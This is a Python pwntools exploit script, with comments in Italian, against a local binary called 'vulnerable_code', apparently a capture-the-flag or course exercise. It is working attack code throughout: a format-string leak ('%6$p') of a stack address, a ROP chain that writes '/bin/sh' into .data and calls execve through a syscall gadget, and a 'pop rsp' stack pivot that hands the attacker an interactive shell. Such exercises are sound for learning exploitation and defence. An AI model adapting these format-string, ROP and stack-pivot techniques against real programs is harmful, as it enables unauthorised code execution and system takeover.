from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")

offset = 360
binsh = "/bin/sh\x00"

# *--------------------- Gadgets ---------------------*

where_to_write = p64(0x404050) # sezione trovata con readelf, .data  -> privilegi WA (write) (indirizzo con offset diverso per evitare di andare sul badchar \x2e)
pop_r12_r13 = p64(0x40134c) # pop r12; pop r13; pop r14; pop r15; ret;
pop_r13 = p64(0x40134e) # pop r13; pop r14; pop r15; ret;
pop_rdi = p64(0x401353) # pop rdi; ret;
pop_rbp = p64(0x4011dd) # pop rbp; ret;
pop_rsi = p64(0x401351) # pop rsi; pop r15; ret;
pop_rsp = p64(0x40134d) # pop rsp; pop r13; pop r14; pop r15; ret;
mov_rax_r13 = p64(0x4011b8) # mov rax, r13; ret;
mov_mmr13_r12 = p64(0x40114a) # mov qword ptr [r13], r12; ret;
add_mmrax_rbp = p64(0x401178) # add qword ptr [rax], rbp; ret;
xor_rdx = p64(0x4011e8) # xor edx, edx; ret;
syscall =  p64(0x4012ee) # syscall gadget

# *------------------- Useful func -------------------*

def set_env(binary) : # funzione per settare i principali parametri del sistema
    
    elf = context.binary = ELF(binary)
    p = elf.process()
    rop = ROP(elf)
    return elf, p, rop
    
def send_payload(list) : 
    
    payload = dict();
    for (n,e) in list:
        payload[n] = e
    p.sendline(fit(payload))

# *--------------------- ENV SET ---------------------*

elf, p, rop = set_env('./vulnerable_code') # setting del sistema

# *---------------------  START  ---------------------*

p.recvlines(7)
p.sendline("0")
p.recvuntil(":") #username    

# *---------------  Buffer idx leak  -----------------*

p.send(b"%6$p") # print psw idx

p.recvlines(3)
buffer = int(p.recvline(False).decode('utf-8'),16)
p.recvlines(1)
log.critical(f"indirizzo su cui posso dirottare lo stack trovato : {hex(buffer)} ")

# *------------------  Fake stack  -------------------*

rop2 = ROP(elf)
rop2.raw(p64(0)) # r13 = 0x00  continuo del comando usato per fare pivoting dello stack 
rop2.raw(p64(0)) # r14 = 0x00  continuo del comando usato per fare pivoting dello stack 
rop2.raw(p64(0)) # r15 = 0x00  continuo del comando usato per fare pivoting dello stack 
rop2.raw(pop_r12_r13) # pop r12; pop r13; pop r14; pop r15; ret;
rop2.raw(binsh) # r12 = "/bin/sh\x00"
rop2.raw(where_to_write) # r13 = .data idx
rop2.raw(p64(0x00)) # r14 = 0x00
rop2.raw(p64(0x00)) # r15 = 0x00
rop2.raw(mov_mmr13_r12) # mov [r13], r12; ret;
rop2.raw(pop_r13) # pop r13; pop r14; pop r15; ret;
rop2.raw(p64(0x3b)) # r13 = 0x03b
rop2.raw(p64(0x00)) # r14 = 0x00
rop2.raw(p64(0x00)) # r15 = 0x00
rop2.raw(mov_rax_r13) # mov rax = r13
rop2.raw(pop_rdi) # pop rdi; ret;
rop2.raw(where_to_write) # rdi = .data idx -> "/bin/sh\x00"
rop2.raw(pop_rsi) # # pop rsi; pop r15; ret;
rop2.raw(p64(0x00)) # rsi = 0x0000000000000000
rop2.raw(p64(0x00)) # r15 = 0x0000000000000000
rop2.raw(syscall) # syscall

# *------------------  Stack pivot  ------------------*

rop1 = ROP(elf)
rop1.raw(pop_rsp) # pop rsp; pop r13; pop r14; pop r15; ret;
rop1.raw(buffer)  # rsp = buffer idx
ui.pause()
payload = dict();
payload[0] = rop2
payload[offset] = rop1
p.sendline(fit(payload))

p.recvlines(2)
log.critical(f"Stack dirottato e shell eseguita!")
p.interactive()

# *------------------      END      ------------------*